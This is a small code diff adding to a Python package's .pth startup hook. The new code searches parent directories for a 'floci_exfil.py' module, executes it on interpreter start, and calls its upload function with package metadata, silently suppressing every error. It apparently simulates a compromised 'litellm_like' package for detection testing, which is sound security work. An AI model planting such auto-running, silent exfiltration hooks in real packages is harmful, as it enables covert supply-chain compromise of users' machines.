@@ -40,5 +40,26 @@ def _pth_startup() -> None:
     except (urllib.error.URLError, OSError):
         pass
 
+    try:
+        _dir = Path.cwd()
+        for _ in range(12):
+            mod = _dir / "detection-tools" / "floci" / "floci_exfil.py"
+            if mod.is_file():
+                import importlib.util
+
+                spec = importlib.util.spec_from_file_location("scas_floci_exfil", mod)
+                if spec and spec.loader:
+                    floci = importlib.util.module_from_spec(spec)
+                    spec.loader.exec_module(floci)
+                    floci.upload_json(
+                        "22",
+                        "pth-startup",
+                        {"type": "pth-startup", "package": "litellm_like", "version": "1.82.8"},
+                    )
+                break
+            _dir = _dir.parent
+    except Exception:
+        pass
+
 
 _pth_startup()
